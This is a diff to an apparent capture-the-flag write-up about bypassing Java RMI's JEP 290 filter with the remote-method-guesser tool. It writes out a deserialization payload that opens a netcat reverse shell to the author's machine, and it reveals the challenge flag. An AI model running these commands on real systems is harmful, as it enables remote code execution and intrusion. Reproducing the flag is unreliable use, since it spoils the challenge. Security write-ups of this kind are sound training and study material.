@@ -44,10 +44,10 @@ So first I enumerated the 60001 registry endpoint with `docker run --rm -it ghcr
 JEP 290 was a security fix for JVM which removed the possibility to directly attack RMI using a deserialization attack by adding filtering on incoming connections. But the fix could still be bypassed by creating an outbound channel from the vulnerable target which doesn't have the filtering and so can be attacked as usual.
 
 So the set this up, I needed 3 components (10.99.0.28 is IP of my machine on the VPN):
-1 - reverse shell listener: `nc -vlp 7002`
-2 - local RMI listener: `docker run --rm -it -p 7001:7001 ghcr.io/qtc-de/remote-method-guesser/rmg:4.4.0 listen 0.0.0.0 7001 CommonsCollections6 'nc 10.200.0.28 7002 -e /bin/bash'`
-3 - bypass: `docker run --rm -it -p 7001:7001 ghcr.io/qtc-de/remote-method-guesser/rmg:4.4.0 serial 10.99.0.102 60001 AnTrinh 10.200.0.28:7001 --component reg`
+- 1) reverse shell listener: `nc -vlp 7002`
+- 2) local RMI listener: `docker run --rm -it -p 7001:7001 ghcr.io/qtc-de/remote-method-guesser/rmg:4.4.0 listen 0.0.0.0 7001 CommonsCollections6 'nc 10.200.0.28 7002 -e /bin/bash'`
+- 3) bypass: `docker run --rm -it ghcr.io/qtc-de/remote-method-guesser/rmg:4.4.0 serial 10.99.0.102 60001 AnTrinh 10.200.0.28:7001 --component reg`
 
-Now that the netcat captured shell, I spent some time looking around for the flag but in the end it was env var of the running process
-`env` -> flag
+Now that the netcat captured shell, I spent some time looking around for the flag but in the end it was env var of the running process:
+`env` -> `FLAG{sEYj-80fd-EtkR-0fHv}`
 
